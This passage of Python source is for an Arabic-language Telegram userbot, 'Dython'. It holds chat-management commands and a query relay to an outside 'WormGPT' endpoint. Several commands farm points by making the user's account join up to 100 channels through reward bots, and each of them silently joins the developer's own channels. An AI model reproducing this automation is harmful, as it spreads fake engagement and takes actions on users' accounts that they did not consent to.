❖╎𝖣y𝗍𝗁𝗈𝗇 . : @Dython
❖╎version : 1.0 - revised 
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
''',  buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])

@bot.on(events.CallbackQuery(pattern='ktab'))
async def callback(event):
    await event.edit("""**Dython Source - اوامر الكتابة 
⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

1- لجعل الكلام يُكتب بالخط العريض ارسل : (`غامق + الجملة`)

2-لجعل الكلام يُكتب بالخط المائل ارسل : (`مائل + الجملة`)

3- لجعل الكلام يُكتب بالخط المنسوخ ارسل : (`نسخ + الجملة`)


⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔**""",  buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])

@bot.on(events.CallbackQuery(pattern='tw3d'))
async def callback(event):
    await event.edit("""**Dython Source - اوامر تجميع وعد 
⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

1- لتجميع البخشيش ارسل امر : `بخشيش وعد + عدد المرات`

2- لتجميع الراتب ارسل امر : `راتب وعد + عدد المرات`

3- لتجميع الكنز ارسل امر : `كنز وعد + عدد المرات`

4- للأستثمار ارسل امر : `استثمار وعد + عدد المرات`

- لأيقاف جميع الاوامر السابقة ارسل امر : `ايقاف وعد`

Dev : @ssuxs

⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔**""",  buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])

@bot.on(events.CallbackQuery(pattern='ext'))
async def callback(event):
    await event.edit("""**Dython Source - اوامر الإكسترا 
⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔

1- لحذف محادثة مع مستخدم ما ارسل امر : `احذف + يوزر المحادثة `

2- لمعرفة نوع اي يوزر ارسل امر : `نوعه + اليوزر`

3- لمعرفة المحظورين لديك ارسل امر : `الحاظرهم`

Dev : @ssuxs

⌔ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⌔**""",  buttons=[Button.inline(" 𝖡𝖺C𝖪 ", 'menuu')])


@Hson.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    await event.edit("waiting...")
    await event.edit(f'''
♔ Dython SOURCE IS WORKING
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
❖╎WELCOME TO TREND SOURCE
❖╎x𝖷x ⌔ 𝟕𝗌𝗈η : @ssuxs
❖╎𝖣y𝗍𝗁𝗈𝗇 . : @Dython
❖╎𝐯𝐞𝐫𝐬𝐢𝐨𝐧 : 1.0 - revised 
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
''')

from telethon import functions
from telethon.sync import errors

@Hson.on(events.NewMessage(outgoing=True, pattern=r"كروباتي$"))
async def main(event):
    result = await Hson(functions.channels.GetGroupsForDiscussionRequest())
    alist = []
    for item in result.chats:
        username = (
            "  | @" + item.username
            if hasattr(item, "username") and item.username
            else " "
        )
        roz = str(item.id) + " | " + item.title + username
        print(roz)
        alist.append(roz)
    if alist:
        await Hson.send_message("me", "\n".join(alist))


@Hson.on(events.NewMessage(outgoing=True, pattern=r"الحاظرهم$"))
async def main(event):
    result = await Hson(
        functions.contacts.GetBlockedRequest(offset=0, limit=1000000)
    )
    alist = []
    for user in result.users:
        if not user.bot:
            username = "@" + user.username if user.username else " "
            roz = f"{user.id} {user.first_name} {username}"
            print(roz)
            alist.append(roz)
    if alist:
        await Hson.send_message("me", "\n".join(alist))


@Hson.on(events.NewMessage(outgoing=True, pattern=r"قيد (.*)"))
async def se(event):
    exe = event.text[5:]
    try:
        result = await Hson(
            functions.messages.ToggleNoForwardsRequest(peer=exe, enabled=True)
        )
        await event.edit("تم بنجاح تفعيل وضع تقييد المحتوى")
    except errors.ChatNotModifiedError as e:
        print(e)  # خاف ما تغير شي يعني القناة اصلا مفعل بيهل تقييد محتوى


@Hson.on(events.NewMessage(outgoing=True, pattern=r"نوعه (.*)"))
async def se(event):
    exe = event.text[5:]
    x = await Hson.get_entity(exe)
    if hasattr(x, "megagroup") and x.megagroup:
        await event.edit("نوع المعرف : كروب")
    elif hasattr(x, "megagroup") and not x.megagroup:
        await event.edit("نوع المعرف : قناة")
    elif hasattr(x, "bot") and x.bot:
        await event.edit("نوع المعرف : بوت")
    else:
        await event.edit("نوع المعرف : لحساب")


@Hson.on(events.NewMessage(outgoing=True, pattern=r"احذف (.*)"))
async def se(event):
    exe = event.text[5:]
    await Hson.get_dialogs()
    chat = exe
    await Hson.delete_dialog(chat, revoke=True)
    await event.edit("- تم بنجاح حذف الدردشة مع المستخدم بنجاح")

@Hson.on(events.NewMessage(outgoing=True, pattern=r"(المطور|مطور|owner)"))
async def _(event):
    await event.edit("waiting...")
    await event.edit(f'''
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
❖╎WELCOME TO DYTHON SOURCE
❖╎x𝖷x ⌔ 𝟕𝗌𝗈η : @ssuxs
❖╎x𝖷x : @Dython
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
''')

@Hson.on(events.NewMessage(outgoing=True, pattern=r"(سورس|السورس|source)"))
async def _(event):
    await event.edit("waiting...")
    await event.edit(f'''
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
❖╎WELCOME TO DYTHON SOURCE
❖╎x𝖷x : @Dython
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
''')
import httpx
import asyncio

@bot.on(events.CallbackQuery(pattern='gpt'))
async def callback(event):
    await event.edit("• Wait, Your Request Is Working..")
    await asyncio.sleep(1)
    await event.delete()
    await asyncio.sleep(1)

    sender = await event.get_sender()
    async with bot.conversation(sender) as conv:    
        await conv.send_message("قم بأرسال سؤالك وسأقوم بالإجابة عليه.")
        response = await conv.get_response()
        user_message = response.text
        url = "https://dev-gpts.pantheonsite.io/wp-admin/js/apis/WormGPT.php?text=" + str(user_message)
        
        async with httpx.AsyncClient() as client:
            response = await client.get(url)
            result = response.text
        
        await bot.send_message(sender.id, result)




@Hson.on(events.NewMessage(outgoing=True, pattern=r"\.ايدي"))
async def _(event):
    reply_message = await event.get_reply_message()
    if reply_message is None:
        try:
            user = (await event.get_sender()).id
            bio = await Hson(functions.users.GetFullUserRequest(id=user))
            bio = bio.about
            photo = await Hson.get_profile_photos(event.sender_id)
            await Hson.send_file(event.chat_id, photo, caption=f'''
    ايديك : `{event.sender_id}`
    البايو : `{bio}`
        ''', reply_to=event)
        except:
            await Hson.send_message(event.chat_id, f"ايديك : `{event.sender_id}`")
    else:
        id = reply_message.from_id.user_id
        try:
            bio = await Hson(functions.users.GetFullUserRequest(id=id))
            bio = bio.about
            photo = await Hson.get_profile_photos(id)
            await Hson.send_file(event.chat_id, photo, caption=f'''
    ايديه : `{id}`
    البايو : `{bio}`
        ''', reply_to=event)
        except:
            await Hson.send_message(event.chat_id, f"ايديه : `{id}`")



@Hson.on(events.NewMessage(outgoing=True, pattern=r".فك المحظورين"))
async def _(event):
    list = await Hson(functions.contacts.GetBlockedRequest(offset=0, limit=1000000))
    if len(list.blocked) == 0:
        razan = await event.edit(f'**ليس لديك اي شخص محظور**')
    else:
        unblocked_count = 1
        for user in list.blocked:
            UnBlock = await Hson(functions.contacts.UnblockRequest(id=int(user.peer_id.user_id)))
            unblocked_count += 1
            razan = await event.edit(f'**جارِ الغاء الحظر : {round((unblocked_count * 100) / len(list.blocked), 2)}%**')
        unblocked_count = 1
        razan = await event.edit(f'**تم الغاء حظر : {len(list.blocked)}**')


@Hson.on(events.NewMessage(outgoing=True, pattern=r"\.اعادة تشغيل"))
async def update(event):
    await event.edit("**جاري اعادة تشغيل السورس**")
    await Hson.disconnect()
    await Hson.send_message("me", "**اكتملت اعادة تشغيل السورس**")


@Hson.on(events.NewMessage(outgoing=True, pattern=r"\.ايقاف النشر التلقائي"))
async def update(event):
    await event.edit("**جاري ايقاف النشر التلقائي**")
    await Hson.disconnect()
    await Hson.send_message("me", "**اكتمل ايقاف النشر التلقائي**")

@Hson.on(events.NewMessage(outgoing=True, pattern=r"\.ايقاف التكرار"))
async def update(event):
    await event.edit("**جاري ايقاف التكرار**")
    await Hson.disconnect()
    await Hson.send_message("me", "**اكتمل ايقاف التكرار**")


c = requests.session()
bot_username = '@eeobot'
bot_usernamee = '@A_MAN9300BOT'
bot_usernameee = '@MARKTEBOT'
bot_usernameeee = '@xnsex21bot'
@Hson.on(events.NewMessage(outgoing=True, pattern=".تجميع المليار"))
async def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await Hson(JoinChannelRequest('dython'))
    channel_entity = await Hson.get_entity(bot_username)
    await Hson.send_message(bot_username, '/start')
    await asyncio.sleep(4)
    msg0 = await Hson.get_messages(bot_username, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await Hson.get_messages(bot_username, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await Hson(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await Hson.send_message(event.chat_id, f"**تم الانتهاء من التجميع**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await Hson(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await Hson(ImportChatInviteRequest(bott))
            msg2 = await Hson.get_messages(bot_username, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await Hson.get_messages(bot_username, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await Hson.send_message(event.chat_id, "**تم الانتهاء من التجميع**")

@Hson.on(events.NewMessage(outgoing=True, pattern=".تجميع الجوكر"))
async def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await Hson(JoinChannelRequest('Dython'))
    channel_entity = await Hson.get_entity(bot_usernamee)
    await Hson.send_message(bot_usernamee, '/start')
    await asyncio.sleep(4)
    msg0 = await Hson.get_messages(bot_usernamee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await Hson.get_messages(bot_usernamee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await Hson(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await Hson.send_message(event.chat_id, f"**تم الانتهاء من التجميع **")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await Hson(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await Hson(ImportChatInviteRequest(bott))
            msg2 = await Hson.get_messages(bot_usernamee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await Hson.get_messages(bot_usernamee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await Hson.send_message(event.chat_id, "**تم الانتهاء من التجميع**")

@Hson.on(events.NewMessage(outgoing=True, pattern=".تجميع العقاب"))
async def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await Hson(JoinChannelRequest('Dython'))
    channel_entity = await Hson.get_entity(bot_usernameee)
    await Hson.send_message(bot_usernameee, '/start')
    await asyncio.sleep(4)
    msg0 = await Hson.get_messages(bot_usernameee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await Hson.get_messages(bot_usernameee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await Hson(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await Hson.send_message(event.chat_id, f"**تم الانتهاء من التجميع | SY**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await Hson(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await Hson(ImportChatInviteRequest(bott))
            msg2 = await Hson.get_messages(bot_usernameee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await Hson.get_messages(bot_usernameee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await Hson.send_message(event.chat_id, "**تم الانتهاء من التجميع | SY**")


@Hson.on(events.NewMessage(outgoing=True, pattern=".تجميع العرب"))
async def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await Hson(JoinChannelRequest('saythonh'))
    channel_entity = await Hson.get_entity(bot_usernameeee)
    await Hson.send_message(bot_usernameeee, '/start')
    await asyncio.sleep(4)
    msg0 = await Hson.get_messages(bot_usernameeee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await Hson.get_messages(bot_usernameeee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await Hson(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await Hson.send_message(event.chat_id, f"**تم الانتهاء من التجميع**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await Hson(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await Hson(ImportChatInviteRequest(bott))
            msg2 = await Hson.get_messages(bot_usernameeee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await Hson.get_messages(bot_usernameeee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await Hson.send_message(event.chat_id, "**تم الانتهاء من التجميع | SY**")
    
from telethon import events





print("♦️ Dython is Running ♦️")
Hson.run_until_disconnected()
##
